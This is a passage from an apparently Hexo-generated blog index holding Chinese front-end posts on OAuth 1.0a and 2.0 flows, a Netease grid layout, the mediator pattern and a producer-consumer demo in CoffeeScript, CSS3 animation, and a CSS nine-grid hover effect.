兔子然后去拿胡萝卜，首先被兔女神拦住了。女神告诉他，你要给我四样东西：老兔子的回复，你的私房照，身份证，还要给我一个密码。兔子愣愣的想了个密码，把这四样东西交了过去 兔女神把这四种东西混在一起，用魔法变出了两件法宝：一封情书和一撮猴子毛…然后她解释说：拿着我的情书去找我老公，他就让你进仓库了；但是这情书会过期，是出于安全考虑啦，过期后你得召唤我再写一封，召唤出我的步骤就是吹一下猴子毛，像孙悟空那样你就别在意这些细节好伐？ 兔子拿着情书去找兔门神时，发现他由于被妻子分担了压力，明显睡眠好多了… 【演员表】兔子-消费者，也就是第三方应用老兔子-用户，也就是我们，记住，我们永远是第三方的亲爹仓库-Oauth提供者，这里有我们保存的资料，比如说新浪微博，qq空间，人人…兔门神-在前两个故事中，由授权服务器和资源服务器共同扮演，在最后的故事中，只由资源服务器扮演兔女神-授权服务器，只管授权，不管取资源 【重要道具】身份证-签名，将一个http请求以及相应参数字符串化拍下的身份证照片-Request Token，服务器进行认证通行证-Access Token，获取资源的凭证私房照-重定向地址坏兔子(我把它当成道具而不是演员)-重定向地址劫持仓库的名称-appId,即对应具体哪个第三方just do it-Auth code，用户授权号第三个故事的身份证-client id 客户端帐号密码-client secret 客户端密码魔法-将client id，client secket，重定向地址，Auth code生成Access Token情书-Access Token，获取资源的凭证猴子毛-Refresh Token，用来在Access Token过期后将其刷新，刷新需带上client id和client secret 【说书人说】Oauth2.0比起Oauth1.0，没有了第一步的签名，将服务器分开为授权服务器与资源服务器。这是最大的两个特征。开放平台必须得做到对第三方友好，才有利于接入。像Oauth1.0签名的操作，就难倒了许多第三方。也许你知道了Oauth2.0接入步骤简化了些，但也知道其内部实现要更复杂，抛去安全方面的考虑，我认为这是正确的方向。因为，Oauth2.0在某种意义上说，向第三方做到了——“把悲伤留给自己，你的美丽让你带走”。","tags":[{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"}]},{"title":"谈谈OAuth1,OAuth2异同","date":"2013-08-11T02:55:00.000Z","path":"2013/08/11/brief-oauth/","text":"一、写在前面在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。 OAuth 1.0a：One Leg -&gt;Two Leg -&gt; Three LeggedOAuth 2:Two Leg -&gt;Three Legged (附：Refresh Token的方式) 这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。 二、OAuth1.0a2.1 OAuth 1.0a (One Leg) 应用给服务器发送一个签名请求，附带以下参数： oauth_token Empty String oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务验证并授予对资源的访问 应用程序利用请求的资源 2.2 OAuth 1.0a (Two Legs) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret Additional Parameters / Arguments 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 2.3 OAuth 1.0a (Three Legged) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret oauth_callback_confirmed … Additional Parameters / Arguments 发送给用户授权的URL oauth_token 提示用户进行授权 用户进行授权 授权结束后返回应用，附带上： oauth_token oauth_verifier 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version oauth_verifier 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 三、OAuth2 3.1 OAuth 2 (Two Legged) 3.1.1 客户端凭据方式 应用发送请求到服务器： grant_type = client_credentials如果没有使用Authorization（Authorization: Basic Base64(client_id:client_secret)） 的header，必须附带参数为： client_id client_secret 服务器以Access Token回应 access_token expires_in token_type 3.1.2 隐式授予方式 应用发送请求到服务器： response_type = token redirect_uri This is a server-side Redirection URI hosted by the provider or yourself. scope state Optional client_id 用户可根据需要授权。 username password 服务器将响应包含access_token在内的redirect_uri 应用程序跳转至redirect_uri redirect_uri将响应一段脚本或HTML片段。响应的脚本或HTML片段包含参数access_token，还有您可能需要的任何其他参数。 3.1.3 资源所有者密码方式 应用向资源所有者请求凭证 username password 应用使用凭证，向服务器发送请求 grant_type = password username passwordurl看起来会像这样：grant_type=password&amp;username=my_username&amp;password=my_password如果你没有使用Authorization的header，必须附带上参数： client_id client_secreturl看起来会像是：grant_type=password&amp;username=my_username&amp;password=my_password&amp;client_id=random_string&amp;client_secret=random_secret 服务器返回Access Toke access_token expires_in token_type 3.2 OAuth 2 (Three Legged) 应用重定向用户到授权服务： client_id redirect_uri response_type state Optional; Unique identifier to protect against CSRF scope Optional; what data your application can access.url看起来会像是：oauth_service/login/oauth/authorize?client_id=3MVG9lKcPoNINVB&amp;redirect_uri=http://localhost/oauth/code_callback&amp;scope=user 用户登录服务器并确认授权给应用 服务器重定向用户到redirect_url ，附带参数： code state 应用拿到code，并换取Access Token client_id client_secret code redirect_uri Optional; grant_type = “authorization_code” 如果的client_id和client_secret是有效的，服务器将调用一个回调redirect_url，包含ACCESS_TOKEN access_token expires_in refresh_token 应用保存ACCESS_TOKEN，在随后的请求中使用。通常这个值被存储在session或或cookie，需要时作为授权请求的参数。 3.3 OAuth 2 (Refresh Token 刷新token) 在OAuth2中，Token会有过期时间，我们必须去refresh_token，使用其他一些先前获得的参数，生成一个新的token。这是一个容易得多的流程。 创建刷新令牌请求 grant_type = “refresh_token” scope Optional; Cannot have any new scopes not previously defined. refresh_token client_id client_secret 服务验证和响应以下参数： access_token issued_at 四、stackoverflow上的一些问答Q：OpenID和OAuth的区别是什么？A：OpenID是有关身份验证（即证明你是谁），OAuth有关授权（即授予访问权限），推荐博文：从用户的角度来看OpenID和OAuth Q：OAuth2与OAuth1不同的地方是？有人可以简单的解释的OAuth2和OAuth1之间的区别吗？ OAuth1现在已经过时，应实施的OAuth2？我没有看到许多实现的OAuth2，大多数仍在使用OAuth，这让我怀疑的OAuth2的准备使用。是吗？A：OAuth2能更好地支持不是基于浏览器的应用。对于不是基于浏览器的应用程序，这是对OAuth的主要挑战。例如，在OAuth1.0，桌面应用或手机应用必须引导用户打开浏览器所需的服务，与服务进行身份验证，并复制令牌从服务返回给应用程序。这里的主要批评是针对用户体验。使用OAuth2.0，可以用新的方式为用户的应用程序获得授权。OAuth2.0不再需要客户端应用程序拥有密钥。这让人回想起老的Twitter认证的API，它并不需要应用得到HMAC哈希令牌和请求字符串。使用OAuth2.0，应用程序可以通过HTTPS获得令牌。OAuth2.0的签名流程简单得多。没有更多的特殊解析，排序，或编码。OAuth2.0的访问令牌是“短命”的。通常情况下，OAuth1.0的访问令牌可以存储一年或一年以上（Twitter从来没有让他们到期）。 OAuth的2.0有刷新令牌的概念。虽然我不能完全肯定这是什么意思，我的猜测是，您的访问令牌可以是短暂存储的（即基于会话），而你可以刷新令牌。你使用刷新令牌获取新的访问令牌，而不是让用户重新授权您的应用程序。最后，OAuth2.0使得负责处理的OAuth请求的服务器和处理用户的授权服务器之间的角色有一个干净的分离。更多信息，在上述的文章中详述。 Q：OAuth2服务器群怎么使用state来防范CSRF？A：state只是一个随机的字符串，可以做这样的事情：$state = md5(uniqid(rand(), TRUE));在session中记录satate，以便稍后你能做验证。一些额外的资料：OAuth2威胁文件模型，特别CSRF保护","tags":[{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"}]},{"title":"网易“聚合阅读”布局的实现","date":"2013-05-03T02:55:00.000Z","path":"2013/05/03/my-news-reader-box/","text":"网易聚合阅读的出现的确让人惊艳了一下。流畅的交互,使碎片化的新闻资讯像报纸一样摊在眼前,这是信息大爆炸的时代产物。不管你能不能接受这种新阅读形式，事实上，每天越来越多的新闻层出不穷，还没被人看到就已成为了“旧闻”。回归报纸的版面设计，堆叠新闻模块，让用户告别一条接一条整齐的新闻链接，而是在一个版面上提供更多的信息，不失为一种尝试。 而抛去产品的层面，从前端方向来看，“聚合阅读”也有许多值得学习的地方。这几天研究了一下源码，谈谈它随机布局的实现，以及一些优化的措施。 demo点击按钮可以改变布局： 一.怎样定义格子对象每个格子对象，都至少应该有这5个属性： left：距离左边界的位置 top：距离上边界的位置 width：格子宽度 height：格子高度 background：格子颜色 逐个去定义对象无疑是愚蠢的：12345678910111213141516171819function Block(o)&#123; return&#123; left: o.left, top: o.top, width: o.width, height: o.height, bg: o.bg &#125;&#125;var block1 = new Block(&#123; left: 0, top: 0, width: 50, height: 50, bg: &quot;#3f3&quot;&#125;);var block2 = ……var block37 = …这样不仅不利于后期维护，而且构造格子的嵌套关系也相对麻烦。 网易的做法是使用“交替切割”的方式来做： 将大块先切成两列。 左列（红色部分）再切成三行，右列（褐，黄，蓝部分）也切成三行。 对形成的6个小块，再进行列的切割 整个做法就是“列-行-列-行-……”这样的交替切割。所以它的对象是这样设置的,其中random属性可以约定同级的cols或rows是否可以随机变换位置，width和height的值是规定一个父级块的分割比例。其设置的形式例如（例子与demo的设定无关）：12345678910111213141516171819202122232425262728293031323334window.tagConfig.pageLayout = &#123; top: 0, left: 0, width: 100, height: 100, random: !1, cols: [&#123; width: 30, rows: [&#123; height: 40, cols: [&#123; width: 30, rows:[&#123; height:100 &#125;] &#125;,&#123; width: 70, rows:[&#123; height:100 &#125;] &#125;] &#125;, &#123; height: 30 &#125;,&#123; height: 30 &#125;] &#125;,&#123; width: 70, rows:[&#123; height:100 &#125;] &#125;]&#125; 二.递归调用切割函数12345678910111213141516171819function _getGrids(tag) &#123; /*domArr是拥有left,top,width,height,bg等属性的所有dom数组，_getGrids的最终目的就是生成这个数组*/ var domArr = [], _cutGrid(tag.pageLayout, function(tag) &#123; if (tag.rows || tag.cols) &#123; /*假如子级存在rows或者cols，则递归切割*/ _cutGrid(tag, arguments.callee); &#125; else &#123; /*子级不存在rows或者cols，不再进行切割，构造domArr*/ … domArr.push(xxx) … &#125; &#125; ); return domArr;&#125; 三.切割函数切割函数挺有意思的，下次想再用一篇文章来详细写一下，在这里仅贴出参考的源码。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889/*对象复制函数*/function _shadowClone(e) &#123; var t = &#123;&#125;; for (var n in e) e.hasOwnProperty(n) &amp;&amp; (t[n] = e[n]); return t;&#125;/*判断子块随机布局与否*/(function() &#123; function ranOrNot(e, t) &#123; var n = []; typeof t == &quot;undefined&quot; &amp;&amp; (t = e, e = 0); for (; e &lt; t; e++) n.push(e); return n &#125; /*随机布局*/ Array.prototype.randomEach = function(t) &#123; console.log(3); if (typeof t != &quot;function&quot;) throw new TypeError; var n = this.length, r = ranOrNot(n); while (n) &#123; var i = Math.floor(Math.random() * n--); if (t(this[r[i]]) === !1) break; r[i] = r[n] &#125; &#125;, /*常规布局*/ Array.prototype.forEach || (Array.prototype.forEach = function(e) &#123; var t = this.length; if (typeof e != &quot;function&quot;) throw new TypeError; var n = arguments[1]; for (var r = 0; r &lt; t; r++) r in this &amp;&amp; e.call(n, this[r], r, this) &#125;)&#125; )();/*切割函数*/function _cutGrid(tag, funcJudge) &#123; function a(a) &#123; function h(cutLength) &#123; /*复制子块对象并计算出子块top,left*/ var u, a = _shadowClone(cutLength); c++, u = c === l ? tag[cutType2.measure] - s: Math.floor(cutLength[cutType2.measure] * tag[cutType2.measure] / 100), a[cutType1.offset] = i + tag[cutType1.offset], a[cutType2.offset] = s + tag[cutType2.offset], a[cutType1.measure] = f, a[cutType2.measure] = u, a.colorPattern = tag.colorPattern, /*判断小块是否还需要分割*/ funcJudge(a), s += u &#125; var f, l = a[cutType2.name].length, c = 0; u++, f = u === cutLength ? tag[cutType1.measure] - i: Math.floor(a[cutType1.measure] * tag[cutType1.measure] / 100), a.random === !1 ? a[cutType2.name].forEach(h) : a[cutType2.name].randomEach(h), s = 0, i += f &#125; /*根据大块是否有rows属性，定义两种切割方式*/ var cutType1, cutType2; tag.rows ? (cutType1 = &#123; name: &quot;rows&quot;, measure: &quot;height&quot;, offset: &quot;top&quot; &#125;, cutType2 = &#123; name: &quot;cols&quot;, measure: &quot;width&quot;, offset: &quot;left&quot; &#125;) : (cutType1 = &#123; name: &quot;cols&quot;, measure: &quot;width&quot;, offset: &quot;left&quot; &#125;, cutType2 = &#123; name: &quot;rows&quot;, measure: &quot;height&quot;, offset: &quot;top&quot; &#125;); var i = 0, s = 0, cutLength = tag[cutType1.name].length, u = 0; /*是否随机布局*/ tag.random === !1 ? tag[cutType1.name].forEach(a) : tag[cutType1.name].randomEach(a)&#125; 四.最后完成到这一步，我已不记得声明对象时出了多少次错误。各种尖括号，方括号，逗号和分号翩翩起舞时，你一定跟我一样很想念coffee的语法糖…","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"模式应用小分享——中介者模式(mediator)","date":"2013-01-02T04:36:00.000Z","path":"2013/01/02/mediator-model/","text":"你需要一种设计模式，一定是哪里出问题了。这问题是指语言天生缺陷，不得不去寻找一种通用的解决方案。 程序设计最后的终点，就是要找到一种解决方案来解决问题。这句话正确无疑。但我又想起有个冷笑话，A对B说：我教你怎么去赢这盘象棋，B问怎样，A回答说：吃掉对方的“帅”就赢了啊。略去中间的过程，直接描述到结果，这其实是毫无意义的。而设计模式，又恰恰关乎中间解决问题的过程。 现在关于模式的文章与书籍层出不穷，我自己也在看。但当我将理论回归应用的时候，一下子就懵了。这么多的模式，就像是一张又一张的棋谱教学，它告诉你要这么那么做，但你很少知道如何对症下药。也许到最后你东拼西凑总可以把“帅”吃掉，但遇到一个问题，如何选择下一步的模式见招拆招，已达到最有效率的胜利呢？ 因此我想写一些模式在应用方面的小分享。 中介者，你想到了什么？我们可以从实况足球谈起。一场足球比赛，进球加分，犯规处罚，控制时间，这些事件都由一个人来处决，我们叫他裁判，其实他就是比赛的中介者。裁判童鞋，代表了一种“控制集中化”的理念，这就是中介者模式的关键。试想一下，我们平时打球一般没有裁判，比分多少，是否犯规等都是由运动员我们自己来记录的，而我们往往都会有记错比分或者犯规纠纷的经验吧。这反应到程序上，就可以说是交互的复杂性带来的混乱。因此，我们在正规的比赛中必须要有裁判，运动员才可以把全部精力放到比赛上面去。于是中介者的引入，把运动员自己的复杂性变成了中介者的复杂性。 再深入一点，为什么有了裁判后，运动员的精力可以更集中呢？原因很简单，我们不需要记对方的分数了，犯规了也用不着自己去跟对方辩论。也就是说，两个队伍之间完全不用有比赛信息的直接交流了，取而代之的是把自己的信息转交给了裁判，让裁判去衡量两个队伍的信息，再进行加分，去判定是否犯规。这时我们可以说，这两个队伍对象解耦了，队伍对象之间的解耦，在客户端程序设计上的效果是很显著的，你很容易再引入一个队伍对象进行管理。试想一下如果有一场奇怪的球赛是有三个，四个队伍一起进行的，有了裁判这个中介者，运动员还是可以集中精力去比赛，否则他们就要去再多记比分了。 一个例子或者点这里弹出看demo三国无双游戏中，有个经典的桥段，大家称为“拼刀”。当两个武将触发拼刀时，武将用武器相互抵着，玩家需要疯狂的按攻击键，一定时间内，谁按的次数多，谁就能赢得拼刀的胜利。其实这就是一个中介者模式的好例子。 其实不止是像这种“比赛”，想想像电力公司，将各家的电力进行集中管理，像给大家批阅试卷，给出成绩的老师，像一下子可以灭所有灯的寝室楼阿姨，像中国人民代表大会…额好吧，总之就是这么回事。 demo代码解析 coffeescript实现（50行）首先我们设定Player对象，它有points和name属性，同时有一个prototype的属性play，使自己的分数加以，并将这信息通知中介者mediator：1234567Player = (name)-&gt; @points = 0 @name = namePlayer::play = -&gt; @points++ mediator.played()然后我们设定scoreboard对象，这是一个得分板，在MVC模式当中，充当了V(view)，视图。它的使命就是update，将传递给它的数据score展示出来。因为裁判是mediator，它判定队伍得分后(得到score)，他必须通知电视台(对应scoreboard)，让他们把分数展示出来：123456789101112131415161718scoreboard = element: document.getElementById &quot;results&quot; update:(score)-&gt; msg = &#x27;&#x27; for key,value of score if score.hasOwnProperty key msg = msg+&quot;&lt;span&gt;&lt;strong&gt;#&#123;key&#125;&lt;/strong&gt;:#&#123;value&#125;&lt;/span&gt;&quot; @element.innerHTML = msg diff = score.Home - score.Guest if diff &gt; 15 alert &quot;Home Win!&quot; location.reload(); else if diff &lt;-15 alert &quot;Guest Win!&quot; location.reload(); else document.getElementById(&#x27;barGuest&#x27;).style.width = 150 + (diff*10) + &#x27;px&#x27;最后的片段就是中介者，mediator。它首先要决定开始比赛，也就是setup，新建了一个名称为Home，一个名称为Guest的Player model。当两个player得分时，mediator执行played，收集两方的分数，构造成score对象，并将这score对象交由scoreboard展示。keypress则是用于判断怎样才算得分：123456789101112131415161718192021mediator = players:&#123;&#125; setup:-&gt; players = @players players.home = new Player &#x27;Home&#x27; players.guest = new Player &#x27;Guest&#x27; played:-&gt; players = @players score = Home: players.home.points Guest:players.guest.points scoreboard.update score keypress:(e)-&gt; e = e|| window.event keycode = e.which if keycode is 102 mediator.players.home.play() return if keycode is 106 mediator.players.guest.play() return最后执行，运行程序：12mediator.setup()window.onkeypress = mediator.keypress 小分享心得中介者模式将控制集中化，colleague对象之间解耦，不必维护各自之间的网状通信，但mediator承受了所有colleague提供过来的信息，肯定会相对复杂。如何优化mediator也会成为一个课题。中介者模式有点像一对多的模型，一个mediator对应多个colleague，而如果现实模型是多对多的，中介者模型视复杂度来说不一定适合。","tags":[{"name":"coffeescript","slug":"coffeescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/coffeescript/"},{"name":"模式","slug":"模式","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%A8%A1%E5%BC%8F/"}]},{"title":"当我想用css3实现一个动作类库","date":"2012-12-30T16:02:00.000Z","path":"2012/12/31/css3-animater/","text":"当我如是想的时候，事实上我已想了很久。后来被各种纠结的差事冲乱了生活和心绪，并且心里认为这是个妥当无比的借口。找到了借口后一拖再拖，果然认识到deadline才是第一生产力的真理。最近，却是被朋友的一句话逼急了，他跟我说：我们的业务用到了css4的新属性！ 这句话的意思，大体等同于说，我买到了一个iphone6，亲你怎么看？ 它在我脑中纷乱起舞，那是plans vs zombies中一大波僵尸正在逼近的场景。是的，再不行动，就要被技术的狂潮给淹没了！日前，就我的浅薄见闻，当html5越来越多的功能被应用到业务主功能上，诸如本地存储，拖拽优化，postMessage通信…css3却是另一番光景。一方面，一个个绚丽效果的css3-demo在网上被围观与叫好，大家却又在为浏览器兼容性和差异性这座大山望而却步。css3技术在大家眼中更偏向于一种优化的体验，等于说，你不敢用它来实现网站的key point，即使是一个圆角，不问技术细节的产品经理也会想使用图片来代替的。 因此，缘由可以归结为：我忍够了。要玩，就玩个大的。 其实虽然我想了很久，但这个“想”，更偏向于单纯的幻想，而不是思考。暑假的时候，在腾讯大讲堂看到有哥们分享css3与js的动画效率比较的演示，就萌生了这个想法。现在，在正式尝试编写类库之前，我想先写2~3个实验demo，来看看技术的复杂度以及一些可以避免的暗礁，并做好一些记录。当然这些demo必须得使用最新的chrome，firefox，opera以及ie8，9才能正常运行。 第一个实验：人物sprite图动画实现，按键与位移的衔接请按键盘方向键控制人物运动： 最深的体会我的js代码需要怎样“辅助”css3？按照我的理解，如果是说一个dom元素的“动作”的话，完全可以用纯css3来实现，而且你可以将dom的动作串连起来。例如：123456789101112131415161718192021222324252627282930@-webkit-keyframes q-down &#123; 0%&#123; -webkit-transform:rotate(0deg); top:10px; &#125; 33%&#123; -webkit-transform: scale(1.5); top:147px; &#125; 66%&#123; top:10px; -webkit-transform: translate(50px,50px); &#125; 100% &#123; top:147px; -webkit-transform:rotate(45deg); &#125;&#125;.box &#123; -webkit-animation:q-down ease; -webkit-animation-duration: 2s; -webkit-animation-timing-function: linear; -webkit-transform:rotate(45deg); width: 100px; height: 100px; background: red; position: absolute; top: 147px; left: 100px;&#125;dom元素会在0%，33%，66%，100%这些时间点上做出相应的效果响应。这样的动作序列还会有什么问题吗？在demo当中，我设置了按一下“左”键，人物向左偏移一格，按一下“下”键，人物下移一格，于是我就遇到了这样的两种情况： 1、用户按下“下”，人物向下偏移动作完成后，他仍不放手，此时同时按了“左” 我认为此时用户在使用“双键”，这时人物会再向左下方向都偏移一格。 2、用户“几乎”同时按下“下”和“左”，由于js每次只能检测单键的keycode 程序会判断用户是先按下了某个键，再使用了双键。 而用户之所以“几乎”同时按下，本是希望只执行“双键”的。 1与2的区别，其实就是双键产生时，两个按键的时间间隔的区别。时间间隔长，用户是需要1这种效果的，而时间间隔短，用户就是想只执行“双键”。但程序是固定的，无论时间间隔有多短，在它看来就是有先后，因此程序认为2和1是一样的。我在demo里，就用了时间戳的方式，而这种方式，其实是“投机取巧”的一种方式。 回到上面那个问题来，这样的纯css3动作序列有什么问题？时间的问题更深入一点我可以得到结论： 那就是无法侦听一个css3动作是否已经结束。如果我能够侦听动作是否正在执行，那么一切就好办了，如果前动作已完成，我就像情况1一样“先单键再双键”去操作，如果前动作未完成，我就判断用户是想只执行“双键”。 OK，js代码就是要像jquery的animate方法一样，构造一个动作的队列，存放用户积累下来的动作，并作好回调判断。","tags":[{"name":"css3","slug":"css3","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/css3/"}]},{"title":"生产者-消费者模型的coffeescript实现","date":"2012-12-24T15:51:00.000Z","path":"2012/12/24/coffee-pc/","text":"这两天一直在看coffeescript相关的东西，也帮一个朋友搞了个生产者-消费者模型的C语言实现。想到还没用coffeescript真正意义上写过程序，那就尝试做一下吧。 其实《CoffeeScript小书》是暑假实习时就买了，一直比较向往着函数式编程却拖延了很久没行动起来。小书只有几十页，本是github上一个开源的项目，我喜欢这种轻巧的文字。语法部分看下来，再看下类与继承，只花了半天的时间，而且心情非常愉悦，然后就可以开始我菜鸟的第一次试飞了。 生产者-消费者模型没什么好说的了，就是读写共享缓冲区，pv操作控制是否冲突。更多的就是冲着coffeescript来的。下面是一些凌乱但自认为有思考价值的记录，或许后续我会继续写一些coffeescript的学习笔记，再做深入的研究。 ##demo，可尝试点击“生产”“消费”按钮 ##litten如是想： 我一定要学一门，至少一门函数式风格编程语言，没有太深远的想法，就觉得它就是我的菜 这个程序是66行的coffeescript代码，最后编译后得到了122行的js代码，说明编程效率提升显著 括号，方括号，花括号，还有逗号有时候会多烦人，特别是使用过ExtJs的人，而coffeescript可以没有 用法简洁的jquery在coffeescript里面会更简洁 关于coffeescript的循环，它不推荐你使用for循环，而是使用“推导”，暴露在底层的循环只有while语法 事件绑定时，使用=&gt;可以免去js上下文切换this的麻烦 coffeescript的数组迭代方法非常的酷，三言两语说不清 javascript会是下一个JVM吗？ 站在产品的角度，我认为coffeescript这名字太长了-_-! ##附上源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667N = 10class ProCon data: mutex:1 empty:N full:0 front:0 rear:0 buf: [] init:-&gt; i = 0 while i&lt;N newDom = $(&#x27;&lt;div class=&quot;bufBox&quot;&gt;&lt;div class=&quot;bufCover&quot;&gt;&#x27;+i+&#x27;&lt;/div&gt;&#x27;+i+&#x27;&lt;/div&gt;&#x27;) $(&#x27;#buf&#x27;).append(newDom) @data.buf.push &#x27;e&#x27; i++ $(&#x27;#produce&#x27;).click =&gt; @producer() $(&#x27;#consume&#x27;).click =&gt; @consumer() p:(num)-&gt; return --num v:(num)-&gt; return ++num produceItem:-&gt; $(&#x27;&lt;p class=&quot;desPro&quot;&gt;生产了产品&lt;/p&gt;&#x27;).insertBefore $(&quot;#des p:first&quot;) return &#x27;m&#x27; consumeItem:-&gt; $(&#x27;&lt;p class=&quot;desCon&quot;&gt;消费了产品&lt;/p&gt;&#x27;).insertBefore $(&quot;#des p:first&quot;) enterItem:(item) -&gt; @data.front = (@data.front+1)%N @data.buf[@data.front] = item; str = &quot;存入产品#&#123;@data.buf[@data.front]&#125;到缓冲区#&#123;@data.front&#125;&quot; $(&quot;&lt;p class=&#x27;desPro&#x27;&gt;#&#123;str&#125;&lt;/p&gt;&quot;).insertBefore $(&quot;#des p:first&quot;) $($(&#x27;.bufCover&#x27;)[@data.front]).animate &quot;height&quot;:&quot;50px&quot; removeItem:-&gt; @data.rear = (@data.rear + 1) % N; @data.buf[@data.rear] = &#x27;e&#x27;; str = &quot;取出产品#&#123;@data.buf[@data.rear]&#125;从缓冲区#&#123;@data.rear&#125;&quot; $(&quot;&lt;p class=&#x27;desCon&#x27;&gt;#&#123;str&#125;&lt;/p&gt;&quot;).insertBefore $(&quot;#des p:first&quot;) $($(&#x27;.bufCover&#x27;)[@data.rear]).animate &quot;height&quot;:&quot;0px&quot; producer:-&gt; if @data.full==N $(&quot;&lt;p class=&#x27;desSpe&#x27;&gt;缓冲区已全满&lt;/p&gt;&quot;).insertBefore $(&quot;#des p:first&quot;) return item = @produceItem() @data.empty = @p(@data.empty) @data.mutex = @p(@data.mutex) @enterItem(item) @data.mutex = @v(@data.mutex) @data.full = @v(@data.full) consumer:-&gt; if @data.empty==N $(&quot;&lt;p class=&#x27;desSpe&#x27;&gt;缓冲区已空&lt;/p&gt;&quot;).insertBefore $(&quot;#des p:first&quot;) return @data.full = @p(@data.full) @data.mutex = @p(@data.mutex) @removeItem() @data.mutex = @v(@data.mutex) @data.empty = @v(@data.empty) @consumeItem() procon = new ProConprocon.init();","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"coffeescript","slug":"coffeescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/coffeescript/"}]},{"title":"css实现九宫格(二)","date":"2012-12-21T05:54:00.000Z","path":"2012/12/21/css-jiugongge2/","text":"书接上回，上回在这。 9个元素，每个50*50px，排成九宫格默认是border颜色为blue，hover到格子上变成red（兼容到IE6） 题目的关键是解决“公用边”，上次我主要做了两个方面的尝试： 用负margin使元素的border叠加用table的border-collapse实现边框合并 这一次的思路则更加简明，也是个人认为是更好的方法。感谢队长提供的思路。 能不能不用border？如果不用border，怎么实现hover后，格子四周变红呢？那肯定是两个dom嵌套在一起，一大一小，小的dom作为“格子”，大的dom作为格子的红色“边框”。先看我初始化的一个格子设定：html：123&lt;div id=&quot;test&quot;&gt; &lt;a href=&quot;#&quot;&gt;&lt;div&gt;1&lt;/div&gt;&lt;/a&gt;&lt;/div&gt;初始css:12345678910111213141516171819202122232425262728293031323334353637383940414243 #test div&#123; width: 50px; line-height: 50px; text-align:center; background: #AAA; &#125; #test a&#123; width: 55px; line-height: 55px; float: left; &#125; #test a:hover&#123; background: red; &#125;```css由于a标签设置了宽度为55px，div标签设置了宽度为50px，这时候格子hover看起来只露出了**右边**的5px红色部分。 接下来，div添加属性&lt;code&gt;margin-top:5px;margin-right:5px&lt;/code&gt;，这时可以显示**上部**的5px边框。再接着，在div的容器，也就是a标签设置&lt;code&gt;padding-left:5px;padding-bottom:5px;&lt;/code&gt;，使格子**左边框**和**下边框**都显示出来。![完成一个格子的设置步骤](/assets/blogImg/jiugongge8.jpg) 那么为什么要将a标签设置为55px，再进行一系列关于margin和padding的设置呢，原因我们最后再说。因此修改后的css为：```css #test div&#123; width: 50px; line-height: 50px; text-align:center; background: #AAA; margin-right:5px; margin-top:5px; &#125; #test a&#123; width: 55px; line-height: 55px; float: left; margin-right: -5px; margin-bottom: -5px; &#125; #test a:hover&#123; background: red; &#125; 九个格子会怎样？将a标签左浮动，同时添加到九个格子，这时候的效果是：两个格子之间会有10px的距离。 为解决“公用边”问题，在a标签添加负值的margin：margin-right:-5px;margin-bottom:-5px;。最后将最外层的容器#test的宽度和高度设置为170px(503+54)，背景设置为蓝色。这时候大功告成了。 最终的代码是：html：1234567891011&lt;div id=&quot;test&quot;&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;1&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;2&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;3&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;4&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;5&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;6&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;7&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;8&lt;/div&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;div&gt;9&lt;/div&gt;&lt;/a&gt;&lt;/div&gt;css：123456789101112131415161718192021222324252627#test&#123; width: 170px; height:170px; background: blue; margin: 0 auto;&#125;#test div&#123; width: 50px; line-height: 50px; text-align:center; background: #AAA; margin-right:5px;/*这句不要也可以*/ margin-top:5px;&#125;#test a&#123; width: 55px; line-height: 55px; float: left; text-decoration: none; padding-left: 5px; padding-bottom: 5px; margin-right: -5px; margin-bottom: -5px;&#125;#test a:hover&#123; background: red;&#125; 巧妙在哪里？ a标签hover前不设置背景色，露出最外层#test的蓝色背景，看起来格子有蓝色的边框；a标签hover时背景色设置为红色，充当了格子的红色边框； 